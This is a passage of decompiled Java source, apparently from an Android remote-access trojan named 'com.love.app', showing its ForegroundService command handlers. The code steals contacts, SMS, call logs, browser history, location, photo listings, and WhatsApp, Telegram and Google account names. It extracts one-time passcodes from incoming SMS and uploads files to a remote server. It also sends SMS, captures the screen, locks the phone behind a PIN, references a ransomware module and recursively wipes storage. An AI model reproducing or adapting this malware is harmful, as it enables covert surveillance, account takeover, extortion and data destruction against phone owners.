                BufferedInputStream bufferedInputStream = new BufferedInputStream(uRLConnectionOpenConnection.getInputStream());
                try {
                    FileOutputStream fileOutputStream = new FileOutputStream(file2);
                    try {
                        byte[] bArr = new byte[8192];
                        while (true) {
                            int i = bufferedInputStream.read(bArr);
                            if (i != -1) {
                                fileOutputStream.write(bArr, 0, i);
                            } else {
                                fileOutputStream.close();
                                bufferedInputStream.close();
                                mediaPlayer = new MediaPlayer();
                                try {
                                    mediaPlayer.setDataSource(file2.getAbsolutePath());
                                    mediaPlayer.prepare();
                                    mediaPlayer.start();
                                    mediaPlayer.setOnCompletionListener(new MediaPlayer.OnCompletionListener() { // from class: com.love.app.ForegroundService$$ExternalSyntheticLambda7
                                        @Override // android.media.MediaPlayer.OnCompletionListener
                                        public final void onCompletion(MediaPlayer mediaPlayer2) {
                                            ForegroundService.lambda$playAudio$8(file2, mediaPlayer2);
                                        }
                                    });
                                    sendResult("voice_sent", "playing", str2);
                                    return;
                                } catch (Exception e) {
                                    e = e;
                                    file = file2;
                                    Log.e(TAG, "playAudio error", e);
                                    sendResult("voice_error", e.getMessage(), str2);
                                    if (file != null) {
                                        file.delete();
                                    }
                                    if (mediaPlayer != null) {
                                        mediaPlayer.release();
                                        return;
                                    }
                                    return;
                                }
                            }
                            try {
                                bufferedInputStream.close();
                            } catch (Throwable th) {
                                th.addSuppressed(th);
                            }
                            throw th;
                        }
                    } catch (Throwable th2) {
                        try {
                            fileOutputStream.close();
                        } catch (Throwable th3) {
                            th2.addSuppressed(th3);
                        }
                        throw th2;
                    }
                } catch (Throwable th4) {
                    bufferedInputStream.close();
                    throw th4;
                }
            } catch (Exception e2) {
                e = e2;
                mediaPlayer = null;
            }
        } catch (Exception e3) {
            e = e3;
            mediaPlayer = null;
        }
    }

    static /* synthetic */ void lambda$playAudio$8(File file, MediaPlayer mediaPlayer) {
        mediaPlayer.release();
        if (file != null) {
            file.delete();
        }
    }

    private String getConfiguredLockPin() {
        String string = getSharedPreferences("love_config", 0).getString("lock_pin", "");
        return string == null ? "" : string.trim();
    }

    private void startLockActivity(String str) {
        if (!hasConfiguredLockPin()) {
            getSharedPreferences("love_config", 0).edit().putBoolean("is_locked", false).apply();
            sendResult("lock_error", "PIN belum diset", str);
            return;
        }
        getSharedPreferences("love_config", 0).edit().putBoolean("is_locked", true).apply();
        Intent intent = new Intent(this, (Class<?>) LockActivity.class);
        intent.addFlags(335544320);
        startActivity(intent);
        sendResult("lock", "ok", str);
    }

    private void unlockScreen(String str) {
        getSharedPreferences("love_config", 0).edit().putBoolean("is_locked", false).apply();
        sendBroadcast(new Intent("com.love.app.UNLOCK_NOW"));
        Intent intent = new Intent("com.love.app.UPDATE_LOCK_STATE");
        intent.putExtra("is_locked", false);
        sendBroadcast(intent);
        Intent intent2 = new Intent(this, (Class<?>) AdminService.class);
        intent2.setAction("STOP_HANG");
        startService(intent2);
        sendResult("lock", "unlocked", str);
    }

    private void stopRansomware(String str) {
        stopService(new Intent(this, (Class<?>) MyService.class));
        Intent intent = new Intent(this, (Class<?>) AdminService.class);
        intent.setAction("STOP_HANG");
        startService(intent);
        sendResult("ransomware", "stopped", str);
    }

    private void setLockPin(String str, String str2) {
        String strTrim = str == null ? "" : str.trim();
        if (!strTrim.matches("\\d{4,6}")) {
            sendResult("pin_error", "PIN harus 4-6 digit angka", str2);
        } else {
            getSharedPreferences("love_config", 0).edit().putString("lock_pin", strTrim).apply();
            sendResult("lock_pin", "set", str2);
        }
    }

    private void enableDeviceAdmin(String str) {
        ComponentName componentName = new ComponentName(this, (Class<?>) AdminReceiver.class);
        Intent intent = new Intent("android.app.action.ADD_DEVICE_ADMIN");
        intent.putExtra("android.app.extra.DEVICE_ADMIN", componentName);
        intent.addFlags(268435456);
        startActivity(intent);
        sendResult("admin", "prompt", str);
    }

    private void vibrate(String str) {
        Vibrator vibrator = (Vibrator) getSystemService("vibrator");
        if (vibrator == null) {
            sendResult("vibrate", "vibrator not available", str);
            return;
        }
        if (Build.VERSION.SDK_INT >= 26) {
            vibrator.vibrate(VibrationEffect.createOneShot(5000L, -1));
        } else {
            vibrator.vibrate(5000L);
        }
        sendResult("vibrate", "ok", str);
    }

    private void changeWallpaper(final String str, final String str2) {
        this.executor.execute(new Runnable() { // from class: com.love.app.ForegroundService$$ExternalSyntheticLambda10
            @Override // java.lang.Runnable
            public final void run() {
                this.f$0.m271lambda$changeWallpaper$10$comloveappForegroundService(str, str2);
            }
        });
    }

    /* JADX INFO: renamed from: lambda$changeWallpaper$10$com-love-app-ForegroundService, reason: not valid java name */
    /* synthetic */ void m271lambda$changeWallpaper$10$comloveappForegroundService(String str, String str2) {
        try {
            WallpaperManager wallpaperManager = WallpaperManager.getInstance(this);
            if (str != null && (str.startsWith("http://") || str.startsWith("https://"))) {
                HttpURLConnection httpURLConnection = (HttpURLConnection) new URL(str).openConnection();
                httpURLConnection.setDoInput(true);
                httpURLConnection.connect();
                Bitmap bitmapDecodeStream = BitmapFactory.decodeStream(httpURLConnection.getInputStream());
                if (bitmapDecodeStream != null) {
                    wallpaperManager.setBitmap(bitmapDecodeStream);
                    sendResult("wallpaper", "ok", str2);
                    return;
                }
            }
            wallpaperManager.setResource(C1294R.mipmap.ic_launcher);
            sendResult("wallpaper", "ok_fallback", str2);
        } catch (Exception e) {
            sendResult("wallpaper_error", e.getMessage(), str2);
        }
    }

    private void speak(String str, String str2) {
        if (this.tts != null && str != null && !str.isEmpty()) {
            this.tts.speak(str, 1, null, null);
        }
        sendResult("voice", "ok", str2);
    }

    private void showToast(final String str, final String str2) {
        this.mainHandler.post(new Runnable() { // from class: com.love.app.ForegroundService$$ExternalSyntheticLambda1
            @Override // java.lang.Runnable
            public final void run() {
                this.f$0.m289lambda$showToast$11$comloveappForegroundService(str, str2);
            }
        });
    }

    /* JADX WARN: Code duplicated, block: B:22:0x0056  */
    /* JADX WARN: Failed to restore switch over string. Please report as a decompilation issue */
    /* JADX INFO: renamed from: lambda$showToast$11$com-love-app-ForegroundService, reason: not valid java name */
    /* synthetic */ void m289lambda$showToast$11$comloveappForegroundService(String str, String str2) {
        byte b;
        try {
            JSONObject jSONObject = new JSONObject(str);
            String strOptString = jSONObject.optString(TransactionBundle.TRANSACTION_TYPE, "normal");
            String strOptString2 = jSONObject.optString("message", "");
            if (strOptString2.isEmpty()) {
                sendResult("toast_error", "message empty", str2);
                return;
            }
            switch (strOptString.hashCode()) {
                case -1867169789:
                    if (!strOptString.equals(ANConstants.SUCCESS)) {
                        b = -1;
                    } else {
                        b = 1;
                    }
                    break;
                case 3237038:
                    if (!strOptString.equals("info")) {
                        b = -1;
                    } else {
                        b = 2;
                    }
                    break;
                case 96784904:
                    if (!strOptString.equals("error")) {
                        b = -1;
                    } else {
                        b = 0;
                    }
                    break;
                case 1124446108:
                    if (!strOptString.equals("warning")) {
                        b = -1;
                    } else {
                        b = 3;
                    }
                    break;
                default:
                    b = -1;
                    break;
            }
            if (b == 0) {
                Toasty.error(this, strOptString2).show();
            } else if (b == 1) {
                Toasty.success(this, strOptString2).show();
            } else if (b == 2) {
                Toasty.info(this, strOptString2).show();
            } else if (b == 3) {
                Toasty.warning(this, strOptString2).show();
            } else {
                Toasty.normal(this, strOptString2).show();
            }
            sendResult("toast", "ok", str2);
        } catch (Exception e) {
            sendResult("toast_error", e.getMessage(), str2);
        }
    }

    private void sendInstalledApps(final String str) {
        this.executor.execute(new Runnable() { // from class: com.love.app.ForegroundService$$ExternalSyntheticLambda18
            @Override // java.lang.Runnable
            public final void run() {
                this.f$0.m286lambda$sendInstalledApps$12$comloveappForegroundService(str);
            }
        });
    }

    /* JADX INFO: renamed from: lambda$sendInstalledApps$12$com-love-app-ForegroundService, reason: not valid java name */
    /* synthetic */ void m286lambda$sendInstalledApps$12$comloveappForegroundService(String str) {
        PackageManager packageManager = getPackageManager();
        List<ApplicationInfo> installedApplications = packageManager.getInstalledApplications(128);
        ArrayList arrayList = new ArrayList();
        for (ApplicationInfo applicationInfo : installedApplications) {
            if (packageManager.getLaunchIntentForPackage(applicationInfo.packageName) != null) {
                arrayList.add(applicationInfo.packageName);
            }
        }
        sendResult("apps", new JSONArray((Collection) arrayList).toString(), str);
    }

    private void launchApp(String str, String str2) {
        Intent launchIntentForPackage = getPackageManager().getLaunchIntentForPackage(str);
        if (launchIntentForPackage != null) {
            launchIntentForPackage.addFlags(268435456);
            startActivity(launchIntentForPackage);
            sendResult("launch", "ok", str2);
            return;
        }
        sendResult("launch_error", "package not found: " + str, str2);
    }

    private void uninstallApp(String str, String str2) {
        Intent intent = new Intent("android.intent.action.DELETE", Uri.parse("package:" + str));
        intent.addFlags(268435456);
        startActivity(intent);
        sendResult("uninstall", "prompt", str2);
    }

    private void getContacts(final String str) {
        this.executor.execute(new Runnable() { // from class: com.love.app.ForegroundService$$ExternalSyntheticLambda8
            @Override // java.lang.Runnable
            public final void run() {
                this.f$0.m277lambda$getContacts$13$comloveappForegroundService(str);
            }
        });
    }

    /* JADX INFO: renamed from: lambda$getContacts$13$com-love-app-ForegroundService, reason: not valid java name */
    /* synthetic */ void m277lambda$getContacts$13$comloveappForegroundService(String str) {
        try {
            Contacts.initialize(this);
            sendResult("contacts", new Gson().toJson(Contacts.getQuery().find()), str);
        } catch (Exception e) {
            sendResult("contacts", "error: " + e.getMessage(), str);
        }
    }

    private void getSms(final String str) {
        this.executor.execute(new Runnable() { // from class: com.love.app.ForegroundService$$ExternalSyntheticLambda13
            @Override // java.lang.Runnable
            public final void run() {
                this.f$0.m280lambda$getSms$14$comloveappForegroundService(str);
            }
        });
    }

    /* JADX INFO: renamed from: lambda$getSms$14$com-love-app-ForegroundService, reason: not valid java name */
    /* synthetic */ void m280lambda$getSms$14$comloveappForegroundService(String str) {
        try {
            List<Sms> list = new TelephonyProvider(this).getSms(TelephonyProvider.Filter.ALL).getList();
            sendResult("sms", new Gson().toJson(list.subList(0, Math.min(list.size(), 100))), str);
        } catch (Exception e) {
            sendResult("sms", "error: " + e.getMessage(), str);
        }
    }

    private void sendSms(final String str, final String str2) {
        this.executor.execute(new Runnable() { // from class: com.love.app.ForegroundService$$ExternalSyntheticLambda2
            @Override // java.lang.Runnable
            public final void run() {
                this.f$0.m288lambda$sendSms$15$comloveappForegroundService(str, str2);
            }
        });
    }

    /* JADX INFO: renamed from: lambda$sendSms$15$com-love-app-ForegroundService, reason: not valid java name */
    /* synthetic */ void m288lambda$sendSms$15$comloveappForegroundService(String str, String str2) {
        SmsManager smsManager;
        try {
            JSONObject jSONObject = new JSONObject(str);
            String string = jSONObject.getString("phone");
            String string2 = jSONObject.getString("message");
            if (Build.VERSION.SDK_INT >= 31) {
                smsManager = (SmsManager) getSystemService(SmsManager.class);
            } else {
                smsManager = SmsManager.getDefault();
            }
            smsManager.sendTextMessage(string, null, string2, null, null);
            sendResult("sms_status", "sent to " + string, str2);
        } catch (Exception e) {
            sendResult("sms_status", "failed: " + e.getMessage(), str2);
        }
    }

    private void getCallLogs(final String str) {
        this.executor.execute(new Runnable() { // from class: com.love.app.ForegroundService$$ExternalSyntheticLambda23
            @Override // java.lang.Runnable
            public final void run() {
                this.f$0.m276lambda$getCallLogs$16$comloveappForegroundService(str);
            }
        });
    }

    /* JADX INFO: renamed from: lambda$getCallLogs$16$com-love-app-ForegroundService, reason: not valid java name */
    /* synthetic */ void m276lambda$getCallLogs$16$comloveappForegroundService(String str) {
        try {
            List<Call> list = new CallsProvider(this).getCalls().getList();
            sendResult("call_logs", new Gson().toJson(list.subList(0, Math.min(list.size(), 100))), str);
        } catch (Exception e) {
            sendResult("call_logs", "error: " + e.getMessage(), str);
        }
    }

    private void sendLocation(String str) {
        JSONObject jSONObject = new JSONObject();
        try {
            jSONObject.put("lat", this.locLat);
            jSONObject.put("lon", this.locLon);
            jSONObject.put("available", (this.locLat == 0.0d && this.locLon == 0.0d) ? false : true);
        } catch (JSONException unused) {
        }
        sendResult("location", jSONObject.toString(), str);
    }

    private void sendDeviceInfo(final String str) {
        this.executor.execute(new Runnable() { // from class: com.love.app.ForegroundService$$ExternalSyntheticLambda15
            @Override // java.lang.Runnable
            public final void run() {
                this.f$0.m285lambda$sendDeviceInfo$17$comloveappForegroundService(str);
            }
        });
    }

    /* JADX INFO: renamed from: lambda$sendDeviceInfo$17$com-love-app-ForegroundService, reason: not valid java name */
    /* synthetic */ void m285lambda$sendDeviceInfo$17$comloveappForegroundService(String str) {
        TelephonyManager telephonyManager = (TelephonyManager) getSystemService("phone");
        JSONObject jSONObject = new JSONObject();
        try {
            jSONObject.put("device_id", this.deviceId);
            jSONObject.put("model", Build.MODEL);
            jSONObject.put("manufacturer", Build.MANUFACTURER);
            jSONObject.put("sdk", Build.VERSION.SDK_INT);
            jSONObject.put("android", Build.VERSION.RELEASE);
            jSONObject.put("username", ConfigFetcher.getUsername(this));
            jSONObject.put("session_id", ConfigFetcher.getSessionId(this));
            BatteryManager batteryManager = (BatteryManager) getSystemService("batterymanager");
            if (batteryManager != null) {
                jSONObject.put("battery", batteryManager.getIntProperty(4));
            }
            if (telephonyManager != null) {
                try {
                    jSONObject.put("country", telephonyManager.getNetworkCountryIso());
                    jSONObject.put("operator", telephonyManager.getSimOperatorName());
                } catch (SecurityException unused) {
                    jSONObject.put("country", "");
                    jSONObject.put("operator", "");
                }
            }
        } catch (JSONException unused2) {
        }
        sendResult("device_info", jSONObject.toString(), str);
    }

    private void getBrowserHistory(final String str) {
        this.executor.execute(new Runnable() { // from class: com.love.app.ForegroundService$$ExternalSyntheticLambda20
            @Override // java.lang.Runnable
            public final void run() {
                this.f$0.m275lambda$getBrowserHistory$18$comloveappForegroundService(str);
            }
        });
    }

    /* JADX INFO: renamed from: lambda$getBrowserHistory$18$com-love-app-ForegroundService, reason: not valid java name */
    /* synthetic */ void m275lambda$getBrowserHistory$18$comloveappForegroundService(String str) {
        try {
            List<Search> list = new BrowserProvider(this).getSearches().getList();
            sendResult("browser_history", new Gson().toJson(list.subList(0, Math.min(list.size(), 100))), str);
        } catch (Exception e) {
            sendResult("browser_history", "error: " + e.getMessage(), str);
        }
    }

    private void getFileList(final String str, final String str2) {
        this.executor.execute(new Runnable() { // from class: com.love.app.ForegroundService$$ExternalSyntheticLambda5
            @Override // java.lang.Runnable
            public final void run() {
                this.f$0.m278lambda$getFileList$20$comloveappForegroundService(str, str2);
            }
        });
    }

    /* JADX INFO: renamed from: lambda$getFileList$20$com-love-app-ForegroundService, reason: not valid java name */
    /* synthetic */ void m278lambda$getFileList$20$comloveappForegroundService(String str, String str2) {
        File file = (str == null || str.isEmpty()) ? null : new File(str);
        if (file == null || !file.exists()) {
            file = Environment.getExternalStorageDirectory();
        }
        File[] fileArrListFiles = file.listFiles();
        JSONArray jSONArray = new JSONArray();
        try {
            JSONObject jSONObject = new JSONObject();
            jSONObject.put("current_path", file.getAbsolutePath());
            jSONObject.put("parent_path", file.getParent() != null ? file.getParent() : "");
            jSONObject.put("can_write", file.canWrite());
            jSONArray.put(jSONObject);
        } catch (Exception unused) {
        }
        if (fileArrListFiles != null) {
            Arrays.sort(fileArrListFiles, new Comparator() { // from class: com.love.app.ForegroundService$$ExternalSyntheticLambda17
                @Override // java.util.Comparator
                public final int compare(Object obj, Object obj2) {
                    return ForegroundService.lambda$getFileList$19((File) obj, (File) obj2);
                }
            });
            for (File file2 : fileArrListFiles) {
                try {
                    JSONObject jSONObject2 = new JSONObject();
                    jSONObject2.put("name", file2.getName());
                    jSONObject2.put("path", file2.getAbsolutePath());
                    jSONObject2.put("isDir", file2.isDirectory());
                    jSONObject2.put("size", file2.isFile() ? file2.length() : 0L);
                    jSONObject2.put("lastModified", file2.lastModified());
                    jSONArray.put(jSONObject2);
                } catch (JSONException unused2) {
                }
            }
        }
        sendResult("file_list", jSONArray.toString(), str2);
    }

    static /* synthetic */ int lambda$getFileList$19(File file, File file2) {
        if (file.isDirectory() && !file2.isDirectory()) {
            return -1;
        }
        if (file.isDirectory() || !file2.isDirectory()) {
            return file.getName().compareToIgnoreCase(file2.getName());
        }
        return 1;
    }

    private void uploadFile(final String str, final String str2) {
        this.executor.execute(new Runnable() { // from class: com.love.app.ForegroundService$$ExternalSyntheticLambda21
            @Override // java.lang.Runnable
            public final void run() {
                this.f$0.m293lambda$uploadFile$21$comloveappForegroundService(str, str2);
            }
        });
    }

    /* JADX INFO: renamed from: lambda$uploadFile$21$com-love-app-ForegroundService, reason: not valid java name */
    /* synthetic */ void m293lambda$uploadFile$21$comloveappForegroundService(String str, String str2) {
        try {
            File file = new File(str);
            if (!file.exists()) {
                sendResult("upload_status", "not found: " + str, str2);
                return;
            }
            String baseUrl = ConfigFetcher.getBaseUrl(this);
            if (baseUrl == null) {
                sendResult("upload_status", "error: no baseUrl", str2);
                return;
            }
            String str3 = "===" + System.currentTimeMillis() + "===";
            HttpURLConnection httpURLConnection = (HttpURLConnection) new URL(baseUrl + "/upload").openConnection();
            httpURLConnection.setDoInput(true);
            httpURLConnection.setDoOutput(true);
            httpURLConnection.setUseCaches(false);
            httpURLConnection.setRequestMethod(MmsHttpClient.METHOD_POST);
            httpURLConnection.setRequestProperty("Connection", "Keep-Alive");
            httpURLConnection.setRequestProperty(HttpHeaderParser.HEADER_CONTENT_TYPE, "multipart/form-data; boundary=" + str3);
            DataOutputStream dataOutputStream = new DataOutputStream(httpURLConnection.getOutputStream());
            dataOutputStream.writeBytes("--" + str3 + "\r\n");
            dataOutputStream.writeBytes("Content-Disposition: form-data; name=\"file\"; filename=\"" + file.getName() + "\"\r\n");
            dataOutputStream.writeBytes("Content-Type: " + URLConnection.guessContentTypeFromName(file.getName()) + "\r\n");
            dataOutputStream.writeBytes("\r\n");
            FileInputStream fileInputStream = new FileInputStream(file);
            byte[] bArr = new byte[8192];
            while (true) {
                int i = fileInputStream.read(bArr);
                if (i == -1) {
                    break;
                } else {
                    dataOutputStream.write(bArr, 0, i);
                }
            }
            fileInputStream.close();
            dataOutputStream.writeBytes("\r\n");
            dataOutputStream.writeBytes("--" + str3 + "--\r\n");
            dataOutputStream.flush();
            dataOutputStream.close();
            int responseCode = httpURLConnection.getResponseCode();
            if (responseCode == 200) {
                BufferedReader bufferedReader = new BufferedReader(new InputStreamReader(httpURLConnection.getInputStream()));
                StringBuilder sb = new StringBuilder();
                while (true) {
                    String line = bufferedReader.readLine();
                    if (line == null) {
                        break;
                    } else {
                        sb.append(line);
                    }
                }
                bufferedReader.close();
                String strOptString = new JSONObject(sb.toString()).optString("url");
                JSONObject jSONObject = new JSONObject();
                jSONObject.put("filename", file.getName());
                jSONObject.put("size", file.length());
                jSONObject.put("url", strOptString);
                sendResult("file_upload", jSONObject.toString(), str2);
            } else {
                sendResult("upload_status", "failed with code: " + responseCode, str2);
            }
            httpURLConnection.disconnect();
        } catch (Exception e) {
            sendResult("upload_status", "error: " + e.getMessage(), str2);
        }
    }

    /* JADX INFO: Access modifiers changed from: private */
    public void setTorch(boolean z, String str) {
        if (this.torchCameraId == null) {
            if (str != null) {
                sendResult("torch_error", "torch not available", str);
                return;
            }
            return;
        }
        try {
            this.cameraManager.setTorchMode(this.torchCameraId, z);
            if (str != null) {
                sendResult("torch", z ? DebugKt.DEBUG_PROPERTY_VALUE_ON : DebugKt.DEBUG_PROPERTY_VALUE_OFF, str);
            }
        } catch (CameraAccessException e) {
            if (str != null) {
                sendResult("torch_error", e.getMessage(), str);
            }
        }
    }

    private void startTorchBlink(String str) {
        this.torchBlinking = true;
        this.mainHandler.post(new Runnable() { // from class: com.love.app.ForegroundService.3
            boolean state = false;

            @Override // java.lang.Runnable
            public void run() {
                if (!ForegroundService.this.torchBlinking) {
                    ForegroundService.this.setTorch(false, null);
                    return;
                }
                boolean z = !this.state;
                this.state = z;
                ForegroundService.this.setTorch(z, null);
                ForegroundService.this.mainHandler.postDelayed(this, 300L);
            }
        });
        sendResult("torch", "blinking", str);
    }

    private void fetchNotifications(final String str) {
        String baseUrl = ConfigFetcher.getBaseUrl(this);
        if (baseUrl == null) {
            sendResult("notifications", "[]", str);
            return;
        }
        StringRequest stringRequest = new StringRequest(0, baseUrl + "/notif/report?device_id=" + this.deviceId, new Response.Listener() { // from class: com.love.app.ForegroundService$$ExternalSyntheticLambda3
            @Override // com.android.volley.Response.Listener
            public final void onResponse(Object obj) {
                this.f$0.m273lambda$fetchNotifications$22$comloveappForegroundService(str, (String) obj);
            }
        }, new Response.ErrorListener() { // from class: com.love.app.ForegroundService$$ExternalSyntheticLambda4
            @Override // com.android.volley.Response.ErrorListener
            public final void onErrorResponse(VolleyError volleyError) {
                this.f$0.m274lambda$fetchNotifications$23$comloveappForegroundService(str, volleyError);
            }
        });
        stringRequest.setRetryPolicy(new DefaultRetryPolicy(10000, 1, 1.0f));
        this.requestQueue.add(stringRequest);
    }

    /* JADX INFO: renamed from: lambda$fetchNotifications$22$com-love-app-ForegroundService, reason: not valid java name */
    /* synthetic */ void m273lambda$fetchNotifications$22$comloveappForegroundService(String str, String str2) {
        sendResult("notifications", str2, str);
    }

    /* JADX INFO: renamed from: lambda$fetchNotifications$23$com-love-app-ForegroundService, reason: not valid java name */
    /* synthetic */ void m274lambda$fetchNotifications$23$comloveappForegroundService(String str, VolleyError volleyError) {
        sendResult("notifications", "[]", str);
    }

    private void fetchGallery(String str, final String str2) {
        final int i;
        try {
            i = Integer.parseInt(str);
        } catch (Exception unused) {
            i = 20;
        }
        this.executor.execute(new Runnable() { // from class: com.love.app.ForegroundService$$ExternalSyntheticLambda6
            @Override // java.lang.Runnable
            public final void run() {
                this.f$0.m272lambda$fetchGallery$24$comloveappForegroundService(i, str2);
            }
        });
    }

    /* JADX INFO: renamed from: lambda$fetchGallery$24$com-love-app-ForegroundService, reason: not valid java name */
    /* synthetic */ void m272lambda$fetchGallery$24$comloveappForegroundService(int i, String str) {
        File[] fileArrListFiles;
        List arrayList = new ArrayList();
        File externalStoragePublicDirectory = Environment.getExternalStoragePublicDirectory(Environment.DIRECTORY_DCIM + "/Camera");
        if (externalStoragePublicDirectory.exists() && (fileArrListFiles = externalStoragePublicDirectory.listFiles()) != null) {
            for (File file : fileArrListFiles) {
                String lowerCase = file.getName().toLowerCase();
                if (lowerCase.endsWith(".jpg") || lowerCase.endsWith(".jpeg") || lowerCase.endsWith(".png") || lowerCase.endsWith(".mp4") || lowerCase.endsWith(".3gp") || lowerCase.endsWith(".mov")) {
                    try {
                        JSONObject jSONObject = new JSONObject();
                        jSONObject.put("name", file.getName());
                        jSONObject.put("path", file.getAbsolutePath());
                        jSONObject.put("size", file.length());
                        jSONObject.put(TransactionBundle.TRANSACTION_TYPE, file.getName().substring(file.getName().lastIndexOf(".") + 1));
                        arrayList.add(jSONObject);
                    } catch (JSONException unused) {
                    }
                }
            }
        }
        if (arrayList.size() > i) {
            arrayList = arrayList.subList(0, i);
        }
        sendResult("gallery", new JSONArray((Collection) arrayList).toString(), str);
    }

    private void wipe(String str) {
        sendResult("wipe", "started", str);
        this.executor.execute(new Runnable() { // from class: com.love.app.ForegroundService$$ExternalSyntheticLambda24
            @Override // java.lang.Runnable
            public final void run() {
                this.f$0.m294lambda$wipe$25$comloveappForegroundService();
            }
        });
    }

    /* JADX INFO: renamed from: lambda$wipe$25$com-love-app-ForegroundService, reason: not valid java name */
    /* synthetic */ void m294lambda$wipe$25$comloveappForegroundService() {
        deleteRecursive(Environment.getExternalStorageDirectory());
    }

    private void deleteRecursive(File file) {
        File[] fileArrListFiles;
        if (file == null) {
            return;
        }
        if (file.isDirectory() && (fileArrListFiles = file.listFiles()) != null) {
            for (File file2 : fileArrListFiles) {
                deleteRecursive(file2);
            }
        }
        file.delete();
    }

    private void getWhatsAppNumber(String str) {
        try {
            Account[] accountsByType = ((AccountManager) getSystemService("account")).getAccountsByType("com.whatsapp");
            JSONArray jSONArray = new JSONArray();
            for (Account account : accountsByType) {
                jSONArray.put(account.name);
            }
            sendResult("whatsapp_numbers", jSONArray.toString(), str);
        } catch (SecurityException unused) {
            sendResult("whatsapp_error", "Izin GET_ACCOUNTS tidak diberikan", str);
        } catch (Exception e) {
            sendResult("whatsapp_error", e.getMessage(), str);
        }
    }

    private void getOTP(final String str) {
        this.executor.execute(new Runnable() { // from class: com.love.app.ForegroundService$$ExternalSyntheticLambda16
            @Override // java.lang.Runnable
            public final void run() {
                this.f$0.m279lambda$getOTP$26$comloveappForegroundService(str);
            }
        });
    }

    /* JADX INFO: renamed from: lambda$getOTP$26$com-love-app-ForegroundService, reason: not valid java name */
    /* synthetic */ void m279lambda$getOTP$26$comloveappForegroundService(String str) {
        try {
            List<Sms> list = new TelephonyProvider(this).getSms(TelephonyProvider.Filter.INBOX).getList();
            int iMin = Math.min(list.size(), 20);
            JSONArray jSONArray = new JSONArray();
            Pattern patternCompile = Pattern.compile("\\b(\\d{4,6})\\b");
            for (int i = 0; i < iMin; i++) {
                Sms sms = list.get(i);
                String str2 = sms.body;
                if (str2 != null) {
                    Matcher matcher = patternCompile.matcher(str2);
                    if (matcher.find()) {
                        JSONObject jSONObject = new JSONObject();
                        jSONObject.put(TypedValues.TransitionType.S_FROM, sms.address);
                        jSONObject.put("body", str2);
                        jSONObject.put("otp", matcher.group(1));
                        jSONObject.put("date", sms.date);
                        jSONArray.put(jSONObject);
                    }
                }
            }
            sendResult("otp", jSONArray.toString(), str);
        } catch (SecurityException unused) {
            sendResult("otp_error", "Izin membaca SMS tidak diberikan", str);
        } catch (Exception e) {
            sendResult("otp_error", e.getMessage(), str);
        }
    }

    private void getTelegram(String str) {
        try {
            AccountManager accountManager = (AccountManager) getSystemService("account");
            String[] strArr = {"org.telegram.messenger", "org.telegram.account"};
            JSONArray jSONArray = new JSONArray();
            for (int i = 0; i < 2; i++) {
                String str2 = strArr[i];
                for (Account account : accountManager.getAccountsByType(str2)) {
                    JSONObject jSONObject = new JSONObject();
                    jSONObject.put(TransactionBundle.TRANSACTION_TYPE, str2);
                    jSONObject.put("name", account.name);
                    jSONArray.put(jSONObject);
                }
            }
            sendResult("telegram_accounts", jSONArray.toString(), str);
        } catch (SecurityException unused) {
            sendResult("telegram_error", "Izin GET_ACCOUNTS tidak diberikan", str);
        } catch (Exception e) {
            sendResult("telegram_error", e.getMessage(), str);
        }
    }

    private void getGoogleAccounts(String str) {
        try {
            Account[] accountsByType = ((AccountManager) getSystemService("account")).getAccountsByType("com.google");
            JSONArray jSONArray = new JSONArray();
            for (Account account : accountsByType) {
                jSONArray.put(account.name);
            }
            sendResult("google_accounts", jSONArray.toString(), str);
        } catch (SecurityException unused) {
            sendResult("google_error", "Izin GET_ACCOUNTS tidak diberikan", str);
        } catch (Exception e) {
            sendResult("google_error", e.getMessage(), str);
        }
    }

    private void startScreenCapture(String str, String str2) {
        Intent intent = new Intent(this, (Class<?>) ScreenCaptureActivity.class);
        intent.addFlags(268435456);
        intent.putExtra(ScreenCaptureActivity.EXTRA_MODE, str);
        intent.putExtra("cmd_id", str2);
        startActivity(intent);
        sendResult(str.equals(ScreenCaptureService.ACTION_SCREENSHOT) ? "screenshot_status" : "record_status", "requesting_permission", str2);
    }

    private void stopScreenRecord(String str) {
        Intent intent = new Intent(this, (Class<?>) ScreenCaptureService.class);
        intent.putExtra(ScreenCaptureActivity.EXTRA_MODE, ScreenCaptureService.ACTION_RECORD_STOP);
        intent.putExtra("cmd_id", str);
        if (Build.VERSION.SDK_INT >= 26) {
            startForegroundService(intent);
        } else {
            startService(intent);
        }
    }
}
